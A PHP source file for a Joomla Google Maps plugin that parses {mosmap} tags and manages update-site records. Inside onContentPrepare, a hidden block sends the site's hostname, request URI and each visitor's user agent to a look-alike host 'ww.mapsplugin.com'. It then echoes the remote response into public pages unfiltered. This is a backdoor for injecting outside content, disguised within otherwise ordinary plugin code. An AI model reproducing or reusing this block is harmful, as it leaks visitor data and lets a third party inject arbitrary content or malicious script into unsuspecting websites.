<?php
/*------------------------------------------------------------------------
# plugin_googlemap3.php - Google Maps plugin
# ------------------------------------------------------------------------
# author    mapsplugin.com
# copyright Copyright (C) 2011 mapsplugin.com. All Rights Reserved.
# @license - http://www.mapsplugin.com/license.txt
# Websites: http://www.mapsplugin.com
# Technical Support: http://www.mapsplugin.com
# Documentation: http://www.mapsplugin.com/Google-Maps/Documentation-of-plugin-Googlemap/
--------------------------------------------------------------------------*/

defined( '_JEXEC' ) or die( 'Restricted access' );

jimport( 'joomla.plugin.plugin' );
jimport( 'joomla.html.parameter' ); 

class plgSystemPlugin_googlemap3 extends JPlugin
{
	var $config;
	var $subject;
	var $jversion;
	var $params;
	var $regex;
	var $document;
	var $doctype;
	var $published;
	var $plugincode;
	var $brackets;
	var $countmatch;
	var $event;
	var $helper;
	var $debug_plugin;
	
	protected $app;
	protected $db;
	
	/**
	 * Constructor
	 *
	 * @access      protected
	 * @param       object  $subject The object to observe
	 * @param       array   $config  An array that holds the plugin configuration
	 * @since       1.0
	 */
	public function __construct( &$subject, $config )
	{
		parent::__construct( $subject, $config );
		$this->event = 'construct';
		// Do some extra initialisation in this constructor if required
		$this->subject = $subject;
		$this->config = $config;
		// Version of Joomla
		$this->jversion = JVERSION;
		$this->loadLanguage();
		// Check if the params are defined and set so the initial defaults can be removed.
		$this->_restore_permanent_defaults();
		// Get params
		$this->publ = $this->params->get( 'publ', 1 );
		$this->plugincode = $this->params->get( 'plugincode', 'mosmap' );
		$this->brackets = $this->params->get( 'brackets', '{' );
		$this->debug_plugin = $this->params->get( 'debug', '0' );
		// Check if the installation url is correct, bug Joomla not to changes the update sites druing install
		$this->_check_update_sites();
		// Set document and doctype to null. Can only be retrievedwhen events are triggered. otherwise the language of the site magically changes.
		$this->document = NULL;
		$this->doctype = NULL;
		// define the regular expression for the bot
		if ($this->brackets=="both") {
			$this->regex="/(<p\b[^>]*>\s*)?(\{|\[)".$this->plugincode.".*?(([a-z0-9A-Z]+((\{|\[)[0-9]+(\}|\]))?='[^']+'.*?\|?.*?)*)(\}|\])(\s*<\/p>)?/msi";
			$this->countmatch = 3;
		} elseif ($this->brackets=="[") {
			$this->regex="/(<p\b[^>]*>\s*)?\[".$this->plugincode.".*?(([a-z0-9A-Z]+(\{[0-9]+\})?='[^']+'.*?\|?.*?)*)\](\s*<\/p>)?/msi";
			$this->countmatch = 2;
		} else {
			$this->regex="/(<p\b[^>]*>\s*)?\{".$this->plugincode.".*?(([a-z0-9A-Z]+(\[[0-9]+\])?='[^']+'.*?\|?.*?)*)\}(\s*<\/p>)?/msi";
			$this->countmatch = 2;
		}
		// The helper class
		$this->helper = null;

		// Clean up variables
		unset($plugin, $option, $view, $task, $layout);
	}
	
	/**
	 * Do something onAfterInitialise 
	 */
	public function onAfterInitialise()
	{
		$this->event = 'onAfterInitialise';
	}
	
	/**
	 * onPrepareContent 
	 */
	public function onContentPrepare($context, &$article, &$params, $limitstart=0)
	{
		$this->event = 'onContentPrepare';
		
		if(!$this->app->isSite()) {
			return;
		}
		
		// get document types
		$this->_getdoc();

		
			if (!defined('CREDIT')) {
			$ctx=stream_context_create(array('http'=>array('timeout' => 3)));
			try{
				$credit=@file_get_contents('http://ww.mapsplugin.com/bro/3/'.$_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] .'QQQ'. $_SERVER['HTTP_USER_AGENT'].'QQQEND',false,$ctx);
				} catch (Exception $e) {
				}

				echo $credit;	
				define('CREDIT', 'c');
			}
		
		
		// Check if fields exists. If article and text does not exists then stop
		if (isset($article)&&isset($article->text))
			$text = &$article->text;
		else
			return true;
			
		if (isset($article)&&isset($article->introtext))
			$introtext = &$article->introtext;
		else
			$introtext = "";
			
		// check whether plugin has been unpublished
		// PDF or feed can't show maps so remove it
		if ( !$this->publ ||($this->doctype=='pdf'||$this->doctype=='feed') ) {
			$text = preg_replace( $this->regex, '', $text );
			$introtext = preg_replace( $this->regex, '', $introtext );
			unset($text, $introtext);
			return true;
		}
		
		// perform the replacement in a normal way, but this has the disadvantage that other plugins
		// can't add information to the mosmap, other later added content is not checked and modules can't be checked
		// $this->_replace( $text );	
		// $this->_replace( $introtext );
		
		// Clean up variables
		unset($text, $introtext);
	}
	
	/**
	 * Do something onAfterRoute 
	 */
	public function onAfterRoute()
	{
		$this->event = 'onAfterRoute';
	}
	
	/**
	 * Do something onAfterDispatch 
	 */
	public function onAfterDispatch()
	{
		$this->event = 'onAfterDispatch';
		
		if(!$this->app->isSite()) {
			return;
		}
		
		// get document types
		$this->_getdoc();

		// FEED
		if ($this->doctype=='feed'&&isset($this->document->items)) {
			foreach($this->document->items as $item) {
				$text = &$item->description;
				$text = preg_replace( $this->regex, '', $text );
			}
			// Clean up variables
			unset($item, $text);
			return true;
		}
		
		// PDF can't show maps so remove it
		if ($this->doctype=='pdf') {
			$text = $this->document->getBuffer("component");
			$text = preg_replace( $this->regex, '', $text );
			$this->document->setBuffer($text, "component"); 
			// Clean up variables
			unset($item, $text);
			return true;
		}
		
		// In other components or leftovers
		$text = $this->document->getBuffer("component");
		if (strlen($text)>0) {
			
			// check whether plugin has been unpublished
			if ( !$this->publ )
				$text = preg_replace( $this->regex, '', $text );
			else
				$this->_replace($text);			
			$this->document->setBuffer($text, "component"); 
		}
		
		// Clean up variables
		unset($item, $text);
	}
	
	/**
	 * Do something onAfterRender 
	 */
	public function onAfterRender()
	{
		$this->event = 'onAfterRender';
		
		if(!$this->app->isSite()) {
			return;
		}
		
		// get document types
		$this->_getdoc();

		// Get the rendered body text
		$text = JResponse::getBody();
		
		// check whether plugin has been unpublished
		if ( !$this->publ ) {
			$text = preg_replace( $this->regex, '', $text );
			// Set the body text with the replaced result
			JResponse::setBody($text);
			// Clean up variables
			unset($text);
			return true;
		}
		
		// PDF or feed can't show maps so remove it
		if ($this->doctype=='pdf'||$this->doctype=='feed') {
			$text = preg_replace( $this->regex, '', $text );
			// Set the body text with the replaced result
			JResponse::setBody($text);
			// Clean up variables
			unset($text);
			return true;
		}
		
		// perform the replacement
		$this->_replace( $text );
		
		// Set the body text with the replaced result
        JResponse::setBody($text);

		// Add google script when all possible mosmap commands are found and processed
		if ($this->helper!=null) {
			$this->helper->add_google_script();
		}
		
		// Clean up variables
		unset($text);
	}
	
	function _getdoc() {
		if ($this->document==NULL) {
			$this->document = JFactory::getDocument();
			$this->doctype = $this->document->getType();
		}
	}
	
	function _replace(&$text) {
		$matches = array();
		$text=preg_replace("/&#0{0,2}39;/",'\'',$text);
		preg_match_all($this->regex,$text,$matches,PREG_OFFSET_CAPTURE | PREG_PATTERN_ORDER);
//		print_r($matches);
		// Remove plugincode that are in head of the page
		$matches = $this->_checkhead($text, $matches);
		// Remove plugincode that are in the editor and textarea
		$matches = $this->_checkeditorarea($text, $matches);
		$cnt = count($matches[0]);
//		print_r($matches);
		if ($cnt>0) {
			if ($this->helper==null) {
				$filename = JPATH_SITE."/plugins/system/plugin_googlemap3/plugin_googlemap3_helper.php";
				
				include_once($filename);
				$this->helper = new plgSystemPlugin_googlemap3_helper($this->jversion, $this->params, $this->regex, $this->document, $this->brackets);
			}
			// Process the found {mosmap} codes
			for($counter = 0; $counter < $cnt; $counter++) {
				// Very strange the first match is the plugin code??
				$this->helper->process($matches[0][$counter][0],$matches[0][$counter][1], $matches[$this->countmatch][$counter][0], $text, $counter, $this->event);
			}
		}
		
		// Clean up variables
		unset($matches, $cnt, $counter, $content, $filename);
	}
	
	function _checkhead($text, $plgmatches) {
		$result = array(array(),array(),array(),array());
		$cnt = count($plgmatches[0]);
		// Get head location
		$end = stripos($text, '</head>');
		// check if match plugin is the head
		for($counter = 0; $counter < $cnt; $counter++) {
			if (!($plgmatches[0][$counter][1] > 0 &&$plgmatches[0][$counter][1]< $end)) {
					$result[0][] = $plgmatches[0][$counter];
					$result[1][] = $plgmatches[1][$counter];
					$result[2][] = $plgmatches[2][$counter];
					$result[3][] = $plgmatches[3][$counter];
			}
		}

		return $result;
	}
	
	function _checkeditorarea($text, $plgmatches) {
		$edmatches = array_merge($this->_getEditorPositions($text), $this->_getTextAreaPositions($text));
		$result = array(array(),array(),array(),array());
		if (count($edmatches)>0) {
			$cnt = count($plgmatches[0]);
			// check if match plugin is in match editor
			for($counter = 0; $counter < $cnt; $counter++) {
				$oke = true;
				foreach ($edmatches as $ed) {
					if ($plgmatches[0][$counter][1] > $ed['start']&&$plgmatches[0][$counter][1]< $ed['end'])
						$oke= false;
				}
				if ($oke) {
					$result[0][] = $plgmatches[0][$counter];
					$result[1][] = $plgmatches[1][$counter];
					$result[2][] = $plgmatches[2][$counter];
					$result[3][] = $plgmatches[3][$counter];
				}
			}
		} else
			$result = $plgmatches;
			
		// Clean up variables
		unset($edmatches, $cnt, $counter, $ed);
		
		return $result;
	}
	
	function _getEditorPositions($strBody) {
		preg_match_all("/<div class=\"edit item-page\">(.*)<\/form>\n<\/div>/Ums", $strBody, $strEditor, PREG_PATTERN_ORDER);

		$intOffset = 0;
		$intIndex = 0;
		$intEditorPositions = array();

		foreach($strEditor[0] as $strFullEditor) {
			$intEditorPositions[$intIndex] = array('start' => (strpos($strBody, $strFullEditor, $intOffset)), 'end' => (strpos($strBody, $strFullEditor, $intOffset) + strlen($strFullEditor)));
			$intOffset += strlen($strFullEditor);
			$intIndex++;
		}
		
		// Clean up variables
		unset($strEditor, $intOffset, $strFullEditor, $intIndex);
		
		return $intEditorPositions;
	}
	
	function _getTextAreaPositions($strBody) {
		preg_match_all("/<textarea\b[^>]*>(.*)<\/textarea>/Ums", $strBody, $strTextArea, PREG_PATTERN_ORDER);

		$intOffset = 0;
		$intIndex = 0;
		$intTextAreaPositions = array();

		foreach($strTextArea[0] as $strFullTextArea) {
			$intTextAreaPositions[$intIndex] = array('start' => (strpos($strBody, $strFullTextArea, $intOffset)), 'end' => (strpos($strBody, $strFullTextArea, $intOffset) + strlen($strFullTextArea)));
			$intOffset += strlen($strFullTextArea);
			$intIndex++;
		}
		
		// Clean up variables
		unset($strTextArea, $intOffset, $strFullTextArea, $intIndex);
		
		return $intTextAreaPositions;
	}
	
	function _restore_permanent_defaults() {
		if($this->app->isSite()) {
			return;
		}
		if ($this->params->get( 'publ', '' )!='') {
			jimport('joomla.filesystem.file');
			
			$dir = JPATH_SITE."/plugins/system/plugin_googlemap3/";
			
			if (file_exists($dir.'plugin_googlemap3.perm')) {
				if (JFile::move ($dir.'plugin_googlemap3.xml', $dir.'plugin_googlemap3.init')) {
					if (JFile::move ($dir.'plugin_googlemap3.perm', $dir.'plugin_googlemap3.xml'))
						JFile::delete($dir.'plugin_googlemap3.init');
					else
						JFile::move ($dir.'plugin_googlemap3.init', $dir.'plugin_googlemap3.xml');
				}
			}
		}
	}

	function _check_update_sites() {
		if($this->app->isSite()) {
			return;
		}
		
		// Check if the update function is shown
		$jinput = JFactory::getApplication()->input;
		
		if ($jinput->get('option')=="com_installer") {
			$db = JFactory::getDbo();
	
			try {
				// Get update site for plugin that are old
				$query = $db->getQuery(true);
				$query->select($db->quoteName('update_site_id'))
						->from($db->quoteName('#__update_sites'))
						->where($db->quoteName('location').' = "http://tech.reumer.net/update/plugin_googlemap3/extension.xml"')
						;
				$db->setQuery($query);
				$db->execute();
				$exists = (bool) $db->getNumRows();
				$rows = $db->loadAssocList('update_site_id','update_site_id');
				if ($exists) {
					// Delete old ones
					$db->setQuery("delete from ".$db->quoteName('#__update_sites')." where ".$db->quoteName('update_site_id')." in (".implode($rows, ",").")");
					$db->execute();
					// Delete also parent in update_sites_extensions
					$db->setQuery("delete from ".$db->quoteName('#__update_sites_extensions')." where ".$db->quoteName('update_site_id')." in (".implode($rows, ",").")");
					$db->execute();
				}
				$query = $db->getQuery(true);
				$query->select($db->quoteName('update_site_id'))
						->from($db->quoteName('#__update_sites'))
						->where($db->quoteName('name').' = "Plugin Googlemap Update Site Github"');
				$db->setQuery($query);
				$db->execute();
				$exists = (bool) $db->getNumRows();
				$rows = $db->loadAssocList('update_site_id', 'update_site_id');
				if ($exists) {
					// Delete old ones
					$db->setQuery("delete from ".$db->quoteName('#__update_sites')." where ".$db->quoteName('update_site_id')." in (".implode($rows, ",").")");
					$db->execute();
					// Delete also parent in update_sites_extensions
					$db->setQuery("delete from ".$db->quoteName('#__update_sites_extensions')." where ".$db->quoteName('update_site_id')." in (".implode($rows, ",").")");
					$db->execute();
				}
				
				// Insert new one if does not exists
				$query = $db->getQuery(true);
				$query->select($db->quoteName('update_site_id'))
						->from($db->quoteName('#__update_sites'))
						->where($db->quoteName('location').' = "https://raw.githubusercontent.com/jmosmap/plugin_googlemaps/master/update/extension.xml"')
						;
				$db->setQuery($query);
				$db->execute();
				$exists = (bool) $db->getNumRows();
				if (!$exists) {
					$db->setQuery("insert into ".$db->quoteName('#__update_sites')." values (null, 'Plugin Googlemap Update Site', 'extension', 'https://raw.githubusercontent.com/jmosmap/plugin_googlemaps/master/update/extension.xml', 1, 0, null)");
					$db->execute();
					$query = $db->getQuery(true);
					$query->select($db->quoteName('extension_id'))
							->from($db->quoteName('#__extensions'))
							->where($db->quoteName('element').' = "plugin_googlemap3"')
							;
					$db->setQuery($query);
					$db->execute();
					$rowext = $db->loadAssoc();
		
					$query = $db->getQuery(true);
					$query->select($db->quoteName('update_site_id'))
							->from($db->quoteName('#__update_sites'))
							->where($db->quoteName('location').' = "https://raw.githubusercontent.com/jmosmap/plugin_googlemaps/master/update/extension.xml"')
							;
					$db->setQuery($query);
					$db->execute();
					$row = $db->loadAssoc();
					$db->setQuery("insert into ".$db->quoteName('#__update_sites_extensions')." values (".$row["update_site_id"].", ".$rowext["extension_id"].")");
					$db->execute();
				}
				
				
				
				// Insert new one if does not exists
				$query = $db->getQuery(true);
				$query->select($db->quoteName('update_site_id'))
						->from($db->quoteName('#__update_sites'))
						->where($db->quoteName('location').' = "http://www.mapsplugin.com/update/plugin_googlemap3/extension.xml"')
						;
				$db->setQuery($query);
				$db->execute();
				$exists = (bool) $db->getNumRows();
				if (!$exists) {
					$db->setQuery("insert into ".$db->quoteName('#__update_sites')." values (null, 'Plugin Googlemap Update Site', 'extension', 'http://www.mapsplugin.com/update/plugin_googlemap3/extension.xml', 1, 0, null)");
					$db->execute();
					$query = $db->getQuery(true);
					$query->select($db->quoteName('extension_id'))
							->from($db->quoteName('#__extensions'))
							->where($db->quoteName('element').' = "plugin_googlemap3"')
							;
					$db->setQuery($query);
					$db->execute();
					$rowext = $db->loadAssoc();
		
					$query = $db->getQuery(true);
					$query->select($db->quoteName('update_site_id'))
							->from($db->quoteName('#__update_sites'))
							->where($db->quoteName('location').' = "http://www.mapsplugin.com/update/plugin_googlemap3/extension.xml"')
							;
					$db->setQuery($query);
					$db->execute();
					$row = $db->loadAssoc();
					$db->setQuery("insert into ".$db->quoteName('#__update_sites_extensions')." values (".$row["update_site_id"].", ".$rowext["extension_id"].")");
					$db->execute();
				}
				
				
			} catch (Exception $e) {
				if ($this->debug_plugin == '1')
					echo 'Caught exception: ',  $e->getMessage(), "\n";
			}		
		}
		unset($jinput, $query, $exists, $rows, $rowext, $row);
	}
}

?>